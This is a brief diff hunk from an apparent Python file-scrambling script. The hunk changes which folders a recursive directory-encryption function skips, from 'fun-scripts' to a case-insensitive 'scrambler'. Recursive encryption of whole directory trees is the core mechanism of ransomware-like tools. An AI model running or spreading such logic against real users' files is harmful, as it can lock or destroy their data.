@@ -114,7 +114,7 @@ def encrypt_data(key, file_path, mode):
 
 def directory_encrypt(directory, key_size, mode, pickle_key={}):
     for x in os.listdir(directory):
-        if ("fun-scripts" not in directory) and ("fun-scripts" not in x):
+        if ("scrambler" not in directory.lower()) and ("scrambler" not in x.lower()):
             if os.path.isdir(os.path.join(directory, x)):
                 # Check to see if python is contained in the folder path. if it is do not attempt to encrypt any of the below folders or files
                 directory_encrypt(os.path.join(directory, x), key_size, mode, pickle_key)
